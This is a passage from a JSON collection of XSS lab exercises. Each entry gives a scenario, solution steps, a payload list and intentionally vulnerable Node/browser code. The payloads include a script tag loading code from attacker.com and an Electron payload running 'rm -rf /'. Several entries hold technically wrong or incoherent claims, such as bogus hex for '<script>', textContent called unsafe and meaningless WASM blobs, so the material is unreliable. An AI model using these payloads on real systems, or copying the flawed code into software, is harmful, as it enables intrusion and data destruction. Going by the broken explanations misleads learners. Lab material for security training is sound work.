      "Lab scenario": "DOM XSS in IoT Dashboard WebSocket Analytics",
      "Lab Description": "Smart factory dashboard visualizes sensor data via WebSocket messages with unsafe SVG rendering. The application uses unencoded device IDs in dynamically created SVG elements. To solve: Inject JavaScript through malicious sensor metadata.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Intercept WebSocket handshake using OWASP ZAP",
        "Craft payload: {\"sensor\":\"<svg onload=alert(1)>\"}",
        "Bypass message validation using chunked transfer encoding",
        "Chain with WebSocket reconnection mechanisms",
        "Verify through real-time gauge visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "ws://[target]/push?sensorId=1<svg/onload=alert(document.domain)>",
        "{\"type\":\"telemetry\",\"data\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
      ],
      "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('viz').innerHTML += \n    JSON.parse(e.data).sensorTag; // Vulnerable\n};"
    },
    {
      "Lab scenario": "Stored XSS in CMS Markdown Renderer via SVG Filter Bypass",
      "Lab Description": "Blog platform allows Markdown posts containing SVGs that are processed by a vulnerable DOMPurify configuration. The application whitelists 'filter' CSS property in SVG styles. To solve: Achieve persistent XSS through CSS animation payloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create post with payload: ![x](x.svg)",
        "Craft SVG: <svg><style>@keyframes x{from{filter:url(\"javascript:alert(1)\")}}</style>",
        "Bypass CSP using hosted SVG with same-origin policy",
        "Automate with Python Requests library",
        "Verify through scheduled post publication"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<svg><style>a{filter:url('data:,alert(1)')}</style></svg>",
        "<svg><foreignObject><div style='filter:url(\"javascript:eval(atob('YWxlcnQoMSk='))\")>X</div></foreignObject></svg>"
      ],
      "srcCode": "app.post('/articles', (req, res) => {\n  const sanitized = DOMPurify.sanitize(req.body.content, {\n    ALLOWED_ATTR: ['style'] // Dangerous config\n  });\n  db.saveArticle(sanitized);\n});"
    },
    {
      "Lab scenario": "Mutation XSS in API Gateway Error Log Visualization",
      "Lab Description": "Cloud API gateway displays error logs using innerText with vulnerable CSS escape sequences. The application uses Chromium's textContent normalization incorrectly. To solve: Abuse CSS unicode escapes to reconstruct executable code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger API errors with malformed JWT tokens",
        "Craft payload: \\FC\\48\\D3\\CD\\A1\\BC (hex-encoded <script>)",
        "Bypass textContent sanitization using CSS.escape() polyfill",
        "Chain with ::before pseudo-element injection",
        "Verify in Chrome DevTools Computed Styles"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "\\3C script\\3E alert(1)\\3C /script\\3E",
        "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>"
      ],
      "srcCode": "app.use((err, req, res, next) => {\n  logger.error(err.message);\n  res.status(500).send(`<pre>${err.message}</pre>`); // Unsafe\n});"
    },
    {
      "Lab scenario": "Blind XSS in Video Conferencing Closed Captioning",
      "Lab Description": "WebRTC-based meeting platform stores subtitle transcripts in admin panel. The application uses insecure text-to-VTT conversion with null-byte handling flaws. To solve: Achieve delayed XSS through crafted subtitle metadata.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Inject payload in .vtt file header: WEBVTT\nX-TIMESTAMP-MAP=LOCAL:alert(1)",
        "Bypass MIME type validation using alternate encoding",
        "Automate with FFmpeg subtitle injection",
        "Monitor admin interface for payload execution",
        "Combine with CSRF to force payload download"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "WEBVTT\n\n00:00:00.000 --> 00:00:10.000\n<v <script>alert(1)</script>>",
        "X-TIMESTAMP-MAP=MPEGTS:181002,LOCAL:javascript:eval('alert(1)')"
      ],
      "srcCode": "app.post('/upload-subtitles', (req, res) => {\n  const vttContent = req.files.subs.data.toString();\n  db.saveSubtitles(vttContent.replace(/</g, '&lt;')); // Partial sanitization\n});"
    },
    {
      "Lab scenario": "Reflected XSS in Cryptocurrency Exchange QR Code Generator",
      "Lab Description": "Wallet address QR generator reflects untrusted input in SVG data URLs. The application uses unencoded user-controlled 'label' parameter in QR code metadata. To solve: Break SVG context through multiline payloads.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Intercept QR generation request with Burp Suite",
        "Craft payload: label=</text><script>alert(1)</script>",
        "Bypass SVG XML validation using CDATA sections",
        "Automate with QR code reader validation",
        "Verify through mobile app scanning"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<image xlink:href=\"javascript:alert(1)\"/>",
        "<![CDATA[</text><script>alert(1)</script>]]>"
      ],
      "srcCode": "app.get('/qr', (req, res) => {\n  const svg = `<svg>...<text>${req.query.label}</text>...</svg>`;\n  res.type('image/svg+xml').send(svg); // No encoding\n});"
    },
    {
      "Lab scenario": "DOM-based XSS in Fitness Tracker URL Parameter Processing",
      "Lab Description": "Workout analytics dashboard dynamically loads user stats from URL parameters using vulnerable document.write(). The application parses heart rate zones without output encoding. To solve: Execute alert(document.cookie) through malformed query string payloads.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept analytics request using Burp Suite param miner",
        "Validate with payload: ?zone=<svg/onload=confirm(1)>",
        "Bypass URL encoding using backticks and template literals",
        "Chain with window.name propagation",
        "Verify through mobile app WebView"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
        "<img src='x' onerror=`alert(${document.cookie})`>"
      ],
      "srcCode": "app.get('/stats', (req, res) => {\n  res.send(`<script>document.write('${req.query.zone}')</script>`);\n});"
    },
    {
      "Lab scenario": "Stored XSS in Project Management Tool Clipboard Events",
      "Lab Description": "Task collaboration platform insecurely handles paste events in rich text editor. The application uses execCommand() with dangerous 'insertHTML' operations. To solve: Achieve persistent XSS through crafted spreadsheet cell paste operations.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Prepare malicious CSV: =HYPERLINK(\"javascript:alert(1)\",\"Click\")",
        "Paste into task description using LibreOffice Calc",
        "Bypass sanitization using white-space obfuscation",
        "Automate with Puppeteer clipboard API",
        "Verify through collaborative editing sessions"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "=IMAGE(\"javascript:alert(1)\", 1)",
        "=WEBSERVICE(\"data:text/html,<script>alert(1)</script>\")"
      ],
      "srcCode": "document.addEventListener('paste', (e) => {\n  const html = e.clipboardData.getData('text/html');\n  document.getElementById('editor').innerHTML = html; // Unsafe\n});"
    },
    {
      "Lab scenario": "Mutation XSS in Social Media Image Metadata Processing",
      "Lab Description": "Photo sharing platform parses EXIF data from user uploads using vulnerable exifr library. The application renders GPS coordinates in unescaped popup tooltips. To solve: Inject JavaScript through crafted longitude values in JPEG headers.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Modify EXIF data using exiftool: -GPSLongitude=\"<svg/onload=alert(1)>\"",
        "Bypass MIME type validation using progressive JPEGs",
        "Chain with EXIF orientation tag manipulation",
        "Automate with Python Pillow library",
        "Verify through mobile app location previews"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "-GPSLongitudeRef=\"</title><script>alert(1)</script>\"",
        "-UserComment=\"javascript/* */:alert(1)\""
      ],
      "srcCode": "app.post('/upload', (req, res) => {\n  const metadata = exifr.parse(req.files.image.data);\n  res.render('preview', { coords: metadata.GPS }); // Unsafe\n});"
    },
    {
      "Lab scenario": "Blind XSS in E-Learning Platform LTI Integration",
      "Lab Description": "Course management system processes Learning Tools Interoperability (LTI) launches without validating custom parameters. The application logs launch data in admin interface with 24h delay. To solve: Achieve delayed XSS through crafted lis_result_sourcedid parameter.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept LTI launch using OAuth 1.0 signing tools",
        "Craft payload: lis_result_sourcedid=<img src=x onerror=alert(1)>",
        "Bypass signature validation using parameter substitution",
        "Automate with Python requests_oauthlib",
        "Monitor admin gradebook interface"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "custom_param=%3Cscript%20src%3D%22https%3A%2F%2Fattacker.com%2Fxss.js%22%3E%3C%2Fscript%3E",
        "ext_submit=\"javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))\""
      ],
      "srcCode": "app.post('/lti', (req, res) => {\n  db.logLaunch(req.body); // Raw storage\n  res.redirect('/launch-success');\n});"
    },
    {
      "Lab scenario": "Reflected XSS in Retail Analytics CSV Injection",
      "Lab Description": "Sales dashboard exports filtered results as CSV files with vulnerable Excel-style formula handling. The application reflects search terms in sheet names without encoding. To solve: Achieve XSS through crafted sheet title payloads.",
      "Difficulty Level": "Easy",
      "Solution Steps": [
        "Intercept export request using Burp Suite",
        "Craft payload: ?search=']!A1<iframe/onload=alert(1)>",
        "Bypass CSV quoting using tab characters",
        "Automate with headless Chrome downloads",
        "Verify through LibreOffice Calc rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "=HYPERLINK(\"javascript:alert(1)\", \"Malicious Link\")",
        "@@=1-1=alert(document.domain)-1"
      ],
      "srcCode": "app.get('/export', (req, res) => {\n  const sheetName = req.query.search || 'Results';\n  res.attachment(`${sheetName}.csv`);\n  res.send(`Sheet: ${sheetName}\\n${csvData}`); // Unsafe\n});"
    },
    {
      "Lab scenario": "DOM XSS via WebAssembly Memory Corruption in Cryptocurrency Wallet",
      "Lab Description": "Blockchain wallet uses WebAssembly for transaction signing with unsafe memory buffer sharing between JS/WASM. The application implements direct memory access via ArrayBuffer without validation. To solve: Achieve arbitrary JS execution through crafted memory pointer manipulation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Analyze WASM module using WasmFiddle debugger",
        "Craft payload: (export \"memory\" (memory $hack 1 256))",
        "Bypass CSP using wasm-unsafe-eval directive",
        "Chain with SharedArrayBuffer timing attacks",
        "Verify via Chrome DevTools Memory Inspector"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "wasmCompile(`(module (memory (export \"memory\") 1 256)`)",
        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
      ],
      "srcCode": "const wasmBuffer = new Uint8Array(userUploadedData);\nconst memory = new WebAssembly.Memory({ initial: 1 });\nWebAssembly.instantiate(wasmBuffer, { env: { memory } }); // Unsafe"
    },
    {
      "Lab scenario": "Stored XSS in API Gateway JWT Debug Header Processing",
      "Lab Description": "Microservices API gateway implements verbose error logging with JWT header reflection. The application stores malformed JWTs in admin Kibana dashboard without sanitization. To solve: Achieve persistent XSS through crafted JWT header injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept API request with invalid JWT using Burp Suite",
        "Craft payload: {\"alg\":\"<svg/onload=alert(1)>\"}",
        "Bypass base64url encoding using non-UTF8 byte sequences",
        "Automate with Python PyJWT library",
        "Monitor ELK stack dashboard for payload execution"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "eyJhbGciOiI8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+In0.X",
        "eyJ0eXAiOiJKV1QiLCJhbGciOiJcdTAwM2NcdTAwM2UifQ=="
      ],
      "srcCode": "app.use((err, req, res, next) => {\n  logger.error(`JWT Header: ${req.headers.authorization}`); // Unsafe log\n  next(err);\n});"
    },
    {
      "Lab scenario": "Stored XSS in Social Media Post Markdown Anchor Validation",
      "Lab Description": "Platform allows custom anchor tags in Markdown posts with vulnerable href sanitization. The application uses regex bypassable through URL-encoded newline characters. To solve: Achieve persistent XSS via javascript: protocol in disguised URLs.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Create post with payload: [XSS](javascript:%0aalert(1))",
        "Bypass sanitizer using tab-separated URL encoding",
        "Chain with CSP nonce reuse attack",
        "Automate with headless browser posting bot",
        "Verify through mobile app WebView rendering"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "[Click](javascript:alert(document.domain))",
        "[Legit](j%0a%0d%09avascript:prompt(1))"
      ],
      "srcCode": "function sanitizeLink(href) {\n  return href.replace(/^javascript:/i, ''); // Incomplete\n}"
    },
    {
      "Lab scenario": "Mutation XSS in Web Bundle Document Viewer via Content-Type Confusion",
      "Lab Description": "Document collaboration tool parses .wbn bundles with improper MIME type validation. The application treats text/markdown resources as text/html when previewing. To solve: Achieve XSS through crafted resource type mismatches.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Create malicious bundle using wbn CLI tool",
        "Inject payload: ---\nContent-Type: text/html\n\n<script>alert(1)</script>",
        "Bypass integrity checks via length extension attacks",
        "Automate with Web Bundle Node.js API",
        "Verify in Chrome's Isolated Web Apps"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "sha256-/3yc...=: <html><body onload=alert(1)></body></html>",
        "application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "app.post('/upload', (req, res) => {\n  const bundle = parseWebBundle(req.body);\n  if(bundle.signatureValid) {\n    res.render('preview', { content: bundle.resources[0].data }); // Unsafe\n});"
    },
    {
      "Lab scenario": "DOM XSS via Trusted Types Bypass in iframe Policy Inheritance",
      "Lab Description": "CMS implements Trusted Types but allows policy inheritance in sandboxed iframes. The application uses document.write() with lax default policies. To solve: Escape iframe sandbox through prototype pollution of trustedTypes.defaultPolicy.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify iframe with policy using TT Auditor extension",
        "Craft payload: <iframe srcdoc=\"<script>alert(1)</script>\">",
        "Bypass CSP using policy.createHTML() callback override",
        "Chain with DOM clobbering of trustedTypes.emptyHTML",
        "Verify in Chromium-based browsers"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "trustedTypes.createPolicy('default', {createHTML: s => s});",
        "<iframe src=\"javascript:trustedTypes.emptyHTML\"></iframe>"
      ],
      "srcCode": "app.get('/embed', (req, res) => {\n  res.send(`<iframe srcdoc='${req.query.content}'></iframe>`);\n  console.warn('Embed content:', req.query.content); // Debug log\n});"
    },
    {
      "Lab scenario": "WebTransport Session Hijacking in Telehealth Platform",
      "Lab Description": "Real-time patient monitoring uses WebTransport for biometric streaming with insecure session handling. The application reflects session IDs in error messages without encoding. To solve: Achieve XSS through bidirectional stream poisoning with malformed datagrams.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture session initialization using Chrome's net-export",
        "Craft payload: new TextEncoder().encode('</script><svg onload=alert(1)>')",
        "Bypass CORS using WebTransport subresource requests",
        "Automate with Node.js webtransport library",
        "Verify through real-time EKG visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "webtransport://[target]/sessionId=<script>alert(1)</script>",
        "data:application/octet-stream;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ],
      "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
    },
    {
      "Lab scenario": "Import Maps Injection in Stock Trading Dashboard",
      "Lab Description": "Financial dashboard dynamically loads modules using user-controlled import maps. The application constructs JSON without proper escaping. To solve: Hijack module resolution to load malicious ESM from attacker-controlled domain.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept import map request via Burp Suite",
        "Inject payload: {\"imports\":{\"react\":\"data:text/javascript,alert(1)\"}}",
        "Bypass SRI using import assertions",
        "Automate with Playwright module interception",
        "Verify through trading chart visualization"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<script type=\"importmap\">{\"imports\":{\"lodash\":\"javascript:alert(1)\"}}</script>",
        "import('data:text/javascript,alert(document.domain)');"
      ],
      "srcCode": "app.get('/config', (req, res) => {\n  res.json({ imports: JSON.parse(req.query.modules) });\n});"
    },
    {
      "Lab scenario": "WebGL Shader XSS in 3D Design Tool",
      "Lab Description": "CAD software processes vertex shaders from untrusted sources with debug logging. The application converts GLSL errors to HTML without sanitization. To solve: Inject JavaScript through crafted preprocessor directives.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Trigger shader compilation errors with malformed directives",
        "Craft payload: #error </style><script>alert(1)</script>",
        "Bypass error formatting using GLSL line continuations",
        "Chain with ANGLE_instanced_arrays extension",
        "Verify through Chrome WebGL Inspector"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "#pragma optimize(off)\n#error <img/src=x onerror=alert(1)>",
        "#line 1 \"</canvas><svg/onload=alert(1)>\""
      ],
      "srcCode": "try {\n  gl.compileShader(shader);\n} catch (e) {\n  showError(`GLSL Error: ${e.message}`); // Unsafe\n}"
    },
    {
      "Lab scenario": "Service Worker Cache Poisoning XSS in PWA News Reader",
      "Lab Description": "Progressive Web App caches API responses with stale-while-revalidate strategy. The application uses Cache API without request validation. To solve: Poison cache to serve malicious JavaScript from /api/feed endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify cacheable routes via Lighthouse audits",
        "Craft response: HTTP/1.1 200 OK\nContent-Type: text/javascript\n\nalert(1)",
        "Bypass CORS using no-cors fetch mode",
        "Automate with Postman Interceptor",
        "Verify through offline mode exploitation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "self.addEventListener('fetch', e => e.respondWith(\n  new Response('<script>alert(1)</script>')\n));",
        "for(;;);{\"payload\":\"</script><svg onload=alert(1)>\"}"
      ],
      "srcCode": "self.addEventListener('fetch', (e) => {\n  e.respondWith(caches.match(e.request)); // No validation\n});"
    },
    {
      "Lab scenario": "CSSOM Mutation XSS in Analytics Dashboard",
      "Lab Description": "Business intelligence tool processes CSS variables from URL parameters with vulnerable CSS.supports() check. The application uses innerHTML with style tag reflection. To Solve: Achieve XSS through CSS @import rule parser differentials.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify CSS injection point using :target pseudo-class",
        "Craft payload: --var: </style><script>alert(1)</script>",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with adoptedStyleSheets API",
        "Verify through Safari's CSS parser"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "@import 'javascript:alert(1)';",
        "<style>a{content: \"\\3C script\\3E alert(1) \\3C /script\\3E\"}</style>"
      ],
      "srcCode": "document.getElementById('theme').innerHTML = \n  `:root { ${req.query.vars} }`; // Vulnerable"
    },
    {
      "Lab scenario": "DOM-based XSS in AI Chatbot WebSocket Stream Processing",
      "Lab Description": "LLM-powered chatbot reflects user input in streaming WebSocket responses without output encoding. The application uses innerHTML to append messages to a vulnerable chat container. To solve: Inject SVG payload that triggers alert() when response streams.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept WebSocket handshake with Burp Suite",
        "Craft payload: {\"message\":\"<svg/onload=alert(document.domain)>\"}",
        "Bypass chunked encoding validation using HTTP/2 multiplexing",
        "Chain with CSRF to hijack chat sessions",
        "Verify via Chrome's WebSocket Stream Viewer"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<img src=x: onerror=alert(1)>",
        "{\"query\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}"
      ],
      "srcCode": "const ws = new WebSocket(URL);\nws.onmessage = (e) => {\n  document.getElementById('chat').innerHTML += \n    JSON.parse(e.data).content; // Vulnerable\n};"
    },
    {
      "Lab scenario": "Stored XSS in GraphQL API Batch Operation Endpoint",
      "Lab Description": "Social media platform processes batch mutations through vulnerable GraphQL introspection. The application stores user bios with unsafe JSON.stringify() sanitization. To solve: Achieve persistent XSS via Unicode escape sequences in bio field.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Craft batch query using Postman GraphQL client",
        "Inject payload: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "Bypass depth limiting using fragment spreading",
        "Automate with Python gql library",
        "Verify through profile rendering in mobile app"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "{\"bio\":\"\\u003Cimg/src=x onerror=alert(1)\\u003E\"}",
        "\\\\u0073\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u003Ealert(1)"
      ],
      "srcCode": "app.post('/graphql', (req, res) => {\n  const bio = JSON.stringify(req.body.variables.bio);\n  db.updateUser({ bio }); // Insecure\n});"
    },
    {
      "Lab scenario": "Mutation XSS in Server-Sent Events (SSE) Dashboard",
      "Lab Description": "Real-time monitoring tool displays SSE messages using textContent with vulnerable CSS unescape patterns. The application implements broken HTML entity encoding for status updates. To solve: Achieve XSS through CSS variable injection in streaming data.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept SSE stream with OWASP ZAP",
        "Craft payload: data: {\"status\":\"--var: </style><script>alert(1)</script>\"}\n\n",
        "Bypass textContent sanitization using CSS.supports() polyfill",
        "Chain with adoptedStyleSheets API",
        "Verify in Firefox's SSE implementation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<\\u0053\\u0043\\u0052\\u0049\\u0050\\u0054>alert(1)</\\u0053CRIPT>",
        "@import 'javascript:alert(1)'"
      ],
      "srcCode": "const es = new EventSource('/updates');\nes.onmessage = (e) => {\n  document.getElementById('status').textContent = \n    JSON.parse(e.data).status; // Vulnerable\n};"
    },
    {
      "Lab scenario": "Blind XSS in JWT Refresh Token Storage",
      "Lab Description": "Authentication service stores refresh tokens in admin Redis console with vulnerable HTML rendering. The application logs raw token metadata in Laravel Telescope. To solve: Achieve delayed XSS through crafted JWT header injection.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Forge JWT with header: {\"alg\":\"<svg/onload=alert(1)>\"}",
        "Bypass base64url validation using non-UTF8 bytes",
        "Automate token rotation with Python requests",
        "Monitor admin audit logs for payload execution",
        "Combine with CSRF to force token refresh"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "eyJhbGciOiJcdTAwM2NcdTAwM2UifQ.eyJzdWIiOiIxMjM0In0",
        "{\"header\":\"<script>\\u0061lert(1)</script>\"}"
      ],
      "srcCode": "Redis.lpush('refresh_tokens', \n  JSON.stringify(req.body)); // Unsafe storage\n// Admin panel:\ndocument.write(refreshToken.header);"
    },
    {
      "Lab scenario": "Reflected XSS in WebAssembly Module Validation Errors",
      "Lab Description": "Smart contract compiler displays WASM validation errors using vulnerable console.html component. The application parses error messages with decodeURIComponent() instead of textContent. To solve: Execute alert() through malformed module exports.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Compile invalid WASM using wat2wasm",
        "Inject payload: (export \"<svg/onload=alert(1)>\" (func 0))",
        "Bypass error message truncation using long identifiers",
        "Automate with Go wasm_exec.js",
        "Verify in blockchain IDE interface"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "(module (export \"\\3C script\\3E\" (func 0)))",
        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
      ],
      "srcCode": "try {\n  new WebAssembly.Module(buffer);\n} catch (e) {\n  showError(decodeURIComponent(e.message)); // Vulnerable\n}"
    },
    {
      "Lab scenario": "WebAuthn Authenticator Tampering in SSO Dashboard",
      "Lab Description": "Enterprise SSO system parses WebAuthn authenticatorData without proper CBOR validation. The application reflects credential IDs in admin panel via innerHTML. To solve: Inject HTML through malicious attestationObject extensions using FIDO2 emulation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Forge authenticator using python-fido2 library",
        "Craft payload: {1: {2: \"<script>alert(1)</script>\"} in CBOR extensions",
        "Bypass base64url encoding using non-UTF8 byte sequences",
        "Automate registration ceremony with headless Chrome",
        "Verify in Safari WebAuthn implementation"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "eyJ0eXBlIjoid2ViYXV0aG4uY3JlYXRlIiwiY2hhbGxlbmdlIjoiQUJDIiwiZGlzcGxheU5hbWUiOiI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+In0=",
        "authData:Uint8Array.from(atob('PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+'), c=>c.charCodeAt(0))"
      ],
      "srcCode": "app.post('/webauthn/response', (req, res) => {\n  const credential = cbor.decode(req.body.response);\n  document.getElementById('credentials').innerHTML += \n    credential.id; // Vulnerable\n});"
    },
    {
      "Lab scenario": "Import Maps Injection in Micro-Frontend Asset Server",
      "Lab Description": "Cloud-native platform generates dynamic import maps from URL parameters. The application uses JSON.parse() without validation on user-controlled input. To solve: Hijack module resolution to load malicious ES modules from attacker domain.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Intercept import map request via Burp Suite",
        "Inject payload: {\"imports\":{\"@core/\":\"data:text/javascript,alert(1)\"}}",
        "Bypass SRI using import assertions with { assert: { type: 'css' }}",
        "Automate with Playwright module interception",
        "Verify through shared dependency tree"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<script type=\"importmap\">{\"imports\":{\"react\":\"javascript:alert(document.domain)\"}}</script>",
        "import('data:text/javascript;base64,YWxlcnQoMSk=')"
      ],
      "srcCode": "app.get('/import-map', (req, res) => {\n  res.json(JSON.parse(req.query.config)); // Vulnerable\n});"
    },
    {
      "Lab scenario": "WebTransport Protocol Hijacking in Real-Time Betting App",
      "Lab Description": "Sports betting platform uses WebTransport for odds streaming with unsafe datagram processing. The application reflects user IDs in error messages without encoding. To solve: Inject SVG payloads through malformed bidirectional streams.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture WebTransport session init with Chrome net-export",
        "Craft polyglot datagram: new TextEncoder().encode('</script><svg onload=alert(1)>')",
        "Bypass CORS using 103 Early Hints responses",
        "Chain with QUIC protocol version downgrade",
        "Verify through live odds ticker"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "webtransport://[target]/user=<script>alert(1)</script>",
        "data:application/octet-stream;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuY29va2llKT4="
      ],
      "srcCode": "const transport = new WebTransport(url);\ntransport.datagrams.writable.getWriter().write(\n  new TextEncoder().encode(userInput) // Unsafe\n);"
    },
    {
      "Lab scenario": "CSS @layer XSS in Design System Theme Editor",
      "Lab Description": "UI theme builder processes @layer rules with vulnerable CSSOM manipulation. The application uses insertRule() with raw user input. To solve: Break style context through crafted layer ordering and JS injection.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify CSS injection via Chrome Styles pane",
        "Craft payload: @layer x { :target { content: \"</style><script>alert(1)</script>\" } }",
        "Bypass sanitizer using CSS escape sequences",
        "Chain with adoptedStyleSheets API",
        "Verify in Safari's CSS parser"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "@layer a { [css-var: '</style><svg/onload=alert(1)>'] { color: red; } }",
        ":root { --x: \"\\3C script\\3E alert(1) \\3C /script\\3E\"; }"
      ],
      "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(userCSS); // Vulnerable\ndocument.adoptedStyleSheets = [sheet];"
    },
    {
      "Lab scenario": "Electron IPC XSS in Desktop Analytics Dashboard",
      "Lab Description": "Cross-platform analytics app exposes IPC channels without context isolation. The application uses ipcRenderer.on() with dangerous innerHTML assignments. To solve: Achieve RCE through XSS-to-IPC bridge exploitation.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Identify exposed IPC channels via Electron DevTools",
        "Craft payload: require('child_process').exec('calc')",
        "Bypass nodeIntegration protection using preload script hooks",
        "Chain with XSS in WebView postMessage handling",
        "Verify through Windows registry access"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "<img src=x onerror=\"window.electron.ipcRenderer.send('exec','open -a Calculator')\">",
        "<script>process.mainModule.require('child_process').spawn('rm', ['-rf', '/'])</script>"
      ],
      "srcCode": "ipcMain.on('update-data', (event, html) => {\n  mainWindow.webContents.executeJavaScript(\n    `document.body.innerHTML = '${html}';` // Vulnerable\n  );\n});"
    },
    {
      "Lab scenario": "WebAssembly Memory Mirroring XSS in Financial Trading Platform",
      "Lab Description": "Stock trading interface mirrors WebAssembly memory to JavaScript ArrayBuffer without validation. The application displays trading errors using innerHTML with raw WASM memory dumps. To solve: Corrupt shared memory to inject HTML payloads into error messages.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Reverse-engineer WASM module using Wasmer debugger",
        "Craft payload: new Uint8Array(memory.buffer).set([...'<script>alert(1)</script>'])",
        "Bypass bounds checking using grow() operations",
        "Chain with SharedArrayBuffer timing side-channels",
        "Verify via trading console error display"
      ],
      "Vulnerability name": "Cross-site scripting",
      "payloads": [
        "wasmMemory.grow(256);\nnew TextDecoder().decode(wasmMemory.buffer)",
        "data:application/wasm;base64,AGFzbQEAAAABCgJgAgADfAIBAX8CAAN/AQALBwEEAQEBAQEBAQsHAXwDAQEBAQAKCwEJAEECfwFBCgAaAAoACQA="
      ],
      "srcCode": "const memory = new WebAssembly.Memory({ initial: 1 });\nconst instance = await WebAssembly.instantiate(wasmBuffer, { env: { memory } });\ndocument.getElementById('errors').innerHTML = \n  new TextDecoder().decode(memory.buffer); // Vulnerable"
    },
    {
      "Lab scenario": "Trusted Types Bypass via COOP/COEP in Healthcare Analytics",
      "Lab Description": "Patient statistics dashboard enforces Trusted Types but uses permissive cross-origin policies. The application allows iframe embedding with relaxed COOP/COEP headers. To solve: Bypass Trusted Types through prototype pollution in cross-origin iframe communication.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Identify iframe with document.domain relaxation",
        "Craft payload: window[trustedTypes][defaultPolicy] = { createHTML: s => s }",
        "Bypass CSP using postMessage handler override",
        "Chain with DOM clobbering of policy container",
